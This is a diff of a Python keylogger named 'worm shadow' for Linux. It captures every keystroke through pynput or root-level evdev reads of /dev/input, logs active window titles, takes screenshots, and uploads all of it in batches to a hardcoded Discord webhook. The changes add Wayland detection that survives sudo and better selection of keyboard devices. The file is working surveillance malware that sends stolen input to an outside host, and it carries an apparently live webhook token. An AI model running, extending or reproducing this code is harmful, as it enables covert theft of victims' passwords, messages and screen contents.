@@ -14,9 +14,10 @@ from pathlib import Path
 
 # ================= CONFIG =================
 WEBHOOK_URL = "https://discord.com/api/webhooks/1558530892736241726/JIDYqHtJXL3xKSmdjRekY2PRrP6kHIeFABNNBuleqxf1_KL0TsPciVB098Grav1tk3ut"
-WEBHOOK_INTERVAL = 5        # sekunden zwischen sends
-WEBHOOK_BATCH_MAX = 30      # max zeilen pro embed
-SEND_SCREENSHOTS = True     # screenshots mitsenden wenn screenshots an
+WEBHOOK_INTERVAL = 5
+WEBHOOK_BATCH_MAX = 30
+SEND_SCREENSHOTS = True
+VERBOSE_KEYS = True        # jede taste im terminal zeigen (debug)
 # ==========================================
 
 # ---------- http backend ----------
@@ -36,6 +37,7 @@ try:
     HTTP_BACKEND = "requests"
 except ImportError:
     import urllib.request
+    import urllib.error
     def http_post_json(url, payload):
         try:
             data = json.dumps(payload).encode()
@@ -49,7 +51,6 @@ except ImportError:
         except Exception as e:
             return -1, str(e)
     def http_post_multipart(url, payload_json, file_field, file_path, filename):
-        # minimal multipart implementation for urllib fallback
         boundary = "----wormshadow" + str(int(time.time() * 1000))
         with open(file_path, "rb") as f:
             file_data = f.read()
@@ -74,7 +75,7 @@ except ImportError:
             return -1, str(e)
     HTTP_BACKEND = "urllib"
 
-# ---------- dep check ----------
+# ---------- deps ----------
 missing = []
 try:
     import mss
@@ -98,15 +99,41 @@ if missing:
     print("[worm shadow] run: python3 setup1.py")
     sys.exit(1)
 
-# ---------- config ----------
+# ---------- runtime detection (env-var-safe, sudo-safe) ----------
+IS_ROOT = (os.geteuid() == 0)
+
+def detect_wayland():
+    """wayland-erkennung, robust gegen sudo env-stripping."""
+    # 1. env var (geht verloren bei sudo, aber prüfen kostet nichts)
+    if os.environ.get("XDG_SESSION_TYPE", "").lower() == "wayland":
+        return True
+    if os.environ.get("WAYLAND_DISPLAY"):
+        return True
+    # 2. socket-file: /run/user/<uid>/wayland-*
+    for base in ("/run/user", "/tmp"):
+        if not os.path.isdir(base):
+            continue
+        for entry in os.listdir(base):
+            if entry.startswith("wayland-"):
+                return True
+            sub = os.path.join(base, entry)
+            if os.path.isdir(sub):
+                try:
+                    for f in os.listdir(sub):
+                        if f.startswith("wayland-"):
+                            return True
+                except PermissionError:
+                    pass
+    return False
+
+IS_WAYLAND = detect_wayland()
+
+# ---------- paths ----------
 LOG_DIR = Path("logs")
 SHOT_DIR = Path("screenshots")
 KEY_LOG = LOG_DIR / "keylog.txt"
 WIN_LOG = LOG_DIR / "windowlog.txt"
 SCREENSHOT_ENABLED = False
-IS_ROOT = (os.geteuid() == 0)
-SESSION = os.environ.get("XDG_SESSION_TYPE", "").lower()
-IS_WAYLAND = SESSION == "wayland"
 
 # ---------- helpers ----------
 def ensure_dirs():
@@ -128,8 +155,9 @@ def append(path, line):
     try:
         with open(path, "a", encoding="utf-8") as f:
             f.write(line + "\n")
-    except Exception:
-        pass
+            f.flush()
+    except Exception as e:
+        print(f"[worm shadow] log write error: {e}")
 
 # ---------- window title ----------
 def get_active_window_title():
@@ -160,66 +188,86 @@ def get_active_window_title():
             pass
     return None
 
-# ---------- key backends ----------
+# ---------- backend: pynput ----------
 def run_pynput_backend():
-    print("[worm shadow] key backend: pynput (x11)")
+    print("[worm shadow] backend: pynput (x11)")
     def on_press(key):
         try:
             if hasattr(key, "char") and key.char is not None:
-                append(KEY_LOG, f"{ts()} | {key.char}")
+                line = f"{ts()} | {key.char}"
+                if VERBOSE_KEYS:
+                    print(f"[key] {key.char}", flush=True)
             else:
-                append(KEY_LOG, f"{ts()} | [{key}]")
+                line = f"{ts()} | [{key}]"
+                if VERBOSE_KEYS:
+                    print(f"[key] [{key}]", flush=True)
+            append(KEY_LOG, line)
         except Exception:
             pass
     listener = pynput_kb.Listener(on_press=on_press)
     listener.start()
     return listener
 
-
+# ---------- backend: evdev ----------
 KEY_NAMES = {}
 if HAS_EVDEV:
     for name in dir(ecodes):
         if name.startswith("KEY_"):
             code = getattr(ecodes, name)
             if isinstance(code, int):
-                KEY_NAMES[code] = name[4:]
+                KEY_NAMES.setdefault(code, name[4:])
+
+def find_keyboard_devices():
+    """listet alle /dev/input/event* die EV_KEY können."""
+    found = []
+    for path in sorted(glob.glob("/dev/input/event*")):
+        try:
+            d = evdev.InputDevice(path)
+            caps = d.capabilities(verbose=False)
+            if ecodes.EV_KEY in caps:
+                # keyboard has lots of KEY_ codes; mouse has only BTN_*
+                key_codes = caps[ecodes.EV_KEY]
+                # filter out obvious mice: they only have BTN_* codes
+                is_mouse = all(c >= ecodes.BTN_MISC for c in key_codes) if key_codes else False
+                found.append((d, path, is_mouse))
+        except Exception:
+            continue
+    return found
 
 
 def run_evdev_backend():
     if not HAS_EVDEV:
-        print("[worm shadow] evdev not installed — cannot use /dev/input backend")
+        print("[worm shadow] evdev not installed")
         return []
     if not IS_ROOT:
-        print("[worm shadow] /dev/input backend needs root. run with sudo.")
+        print("[worm shadow] evdev braucht root. starte mit sudo.")
         return []
 
-    devices = []
-    for path in glob.glob("/dev/input/event*"):
-        try:
-            d = evdev.InputDevice(path)
-            if ecodes.EV_KEY in d.capabilities():
-                devices.append(d)
-        except Exception:
-            continue
-
-    if not devices:
-        print("[worm shadow] no readable input devices found.")
+    devices_info = find_keyboard_devices()
+    if not devices_info:
+        print("[worm shadow] keine /dev/input devices gefunden.")
         return []
 
-    print(f"[worm shadow] key backend: evdev on {len(devices)} device(s)")
+    print(f"[worm shadow] backend: evdev — {len(devices_info)} device(s):")
+    for d, path, is_mouse in devices_info:
+        kind = "mouse" if is_mouse else "keyboard"
+        print(f"  {path} — {d.name} ({kind})")
 
-    def read_device(dev):
+    def read_device(dev, path):
         try:
             for event in dev.read_loop():
                 if event.type == ecodes.EV_KEY and event.value == 1:
                     name = KEY_NAMES.get(event.code, f"key_{event.code}")
-                    append(KEY_LOG, f"{ts()} | [{name}]")
-        except Exception:
-            pass
+                    line = f"{ts()} | [{name}]"
+                    if VERBOSE_KEYS:
+                        print(f"[key {path}] {name}", flush=True)
+                    append(KEY_LOG, line)
+        except Exception as e:
+            print(f"[worm shadow] read error on {path}: {e}")
 
     threads = []
-    for d in devices:
-        t = threading.Thread(target=read_device, args=(d,), daemon=True)
+    for d, path, _ in devices_info:
+        t = threading.Thread(target=read_device, args=(d, path), daemon=True)
         t.start()
         threads.append(t)
     return threads
@@ -232,6 +280,7 @@ def window_monitor(stop_event):
         if title and title != last:
             last = title
             append(WIN_LOG, f"{ts()} | {title}")
+            print(f"[win] {title}", flush=True)
             if SCREENSHOT_ENABLED:
                 take_screenshot(title)
         time.sleep(1)
@@ -248,16 +297,15 @@ def take_screenshot(title):
             fname = f"{stamp}_{safe_filename(title)}.png"
             path = SHOT_DIR / fname
             mss.tools.to_png(img.rgb, img.size, output=str(path))
+            print(f"[shot] {path.name}", flush=True)
             return path
-    except Exception:
+    except Exception as e:
+        print(f"[worm shadow] screenshot error: {e}")
         return None
 
 # ---------- webhook ----------
 def send_test_ping():
-    """Send a startup ping so you know the webhook works."""
-    payload = {
-        "content": f"[worm shadow] online — host: `{os.uname().nodename}` | backend: `{HTTP_BACKEND}`"
-    }
+    payload = {"content": f"[worm shadow] online — host: `{os.uname().nodename}` | backend: `{HTTP_BACKEND}`"}
     code, body = http_post_json(WEBHOOK_URL, payload)
     print(f"[worm shadow] webhook test → HTTP {code}")
     if code not in (200, 204):
@@ -290,11 +338,9 @@ class WebhookSender(threading.Thread):
     def run(self):
         print("[worm shadow] webhook sender running")
         while not self.stop_event.is_set():
-            # first run: send immediately; after that: sleep interval
             if not self.first_run:
                 time.sleep(WEBHOOK_INTERVAL)
             self.first_run = False
-
             try:
                 key_lines, self.key_pos = self._read_new(KEY_LOG, self.key_pos)
                 win_lines, self.win_pos = self._read_new(WIN_LOG, self.win_pos)
@@ -333,12 +379,10 @@ class WebhookSender(threading.Thread):
                         for shot in shots[self.shot_pos:]:
                             print(f"[worm shadow] uploading {shot.name}")
                             payload_json = json.dumps({"content": f"screenshot: `{shot.name}`"})
-                            code, body = http_post_multipart(
-                                self.url, payload_json, "file", str(shot), shot.name)
+                            code, body = http_post_multipart(self.url, payload_json, "file", str(shot), shot.name)
                             if code not in (200, 204):
                                 print(f"[worm shadow] shot upload failed: HTTP {code} — {body}")
                         self.shot_pos = len(shots)
-
             except Exception as e:
                 print(f"[worm shadow] webhook loop error: {e}")
 
@@ -348,43 +392,42 @@ def main():
     ensure_dirs()
 
     print("[worm shadow] linux all-in-one logger (kali)")
-    print(f"  session:     {SESSION or 'unknown'}")
+    print(f"  session:     {'wayland' if IS_WAYLAND else 'x11/unknown'}")
     print(f"  root:        {IS_ROOT}")
     print(f"  http:        {HTTP_BACKEND}")
     print(f"  webhook:     {'set' if WEBHOOK_URL else 'NOT SET'}")
     print(f"  logs:        {LOG_DIR.resolve()}")
     print(f"  screenshots: {SHOT_DIR.resolve()}")
 
-    # startup ping
-    if WEBHOOK_URL:
-        send_test_ping()
-    else:
-        print("[worm shadow] WARNING: WEBHOOK_URL empty — nothing will be sent.")
+    if not WEBHOOK_URL:
+        print("[worm shadow] WARNING: WEBHOOK_URL empty.")
         sys.exit(1)
 
-    # key backend
+    send_test_ping()
+
+    # backend wahl — evdev hat vorrang wenn wir root sind und evdev da ist
+    # das funktioniert auf wayland UND x11, also nehmen wir es wenn möglich immer.
     listener = None
     ev_threads = []
 
-    if IS_WAYLAND:
-        if IS_ROOT and HAS_EVDEV:
-            ev_threads = run_evdev_backend()
-            if not ev_threads:
-                print("[worm shadow] no evdev backend — exiting.")
-                sys.exit(1)
+    use_evdev = HAS_EVDEV and IS_ROOT
+    use_pynput = HAS_PYNPUT and not IS_WAYLAND
+
+    if use_evdev:
+        ev_threads = run_evdev_backend()
+        if not ev_threads:
+            print("[worm shadow] evdev nichts gelesen — fallback auf pynput versuchen")
+            use_evdev = False
+
+    if not ev_threads:
+        if use_pynput:
+            listener = run_pynput_backend()
         elif HAS_PYNPUT:
-            print("[worm shadow] wayland + non-root: pynput will get nothing.")
-            listener = run_pynput_backend()
-        else:
-            print("[worm shadow] no usable key backend on wayland. exiting.")
+            print("[worm shadow] wayland ohne root — pynput kriegt nichts. exit.")
+            print("[worm shadow] starte mit: sudo .venv/bin/python keylogger.py")
             sys.exit(1)
-    else:
-        if HAS_PYNPUT:
-            listener = run_pynput_backend()
-        elif IS_ROOT and HAS_EVDEV:
-            ev_threads = run_evdev_backend()
         else:
-            print("[worm shadow] no usable key backend. exiting.")
+            print("[worm shadow] kein backend verfügbar. exit.")
             sys.exit(1)
 
     choice = input("Enable screenshots? (y/N): ").strip().lower()
@@ -396,6 +439,7 @@ def main():
 
     SCREENSHOT_ENABLED = True
     print("[worm shadow] screenshots on. logging. ctrl+c to stop.")
+    print("[worm shadow] tipp was — du solltest [key ...] zeilen sehen.")
 
     stop_event = threading.Event()
     wm_thread = threading.Thread(target=window_monitor, args=(stop_event,), daemon=True)
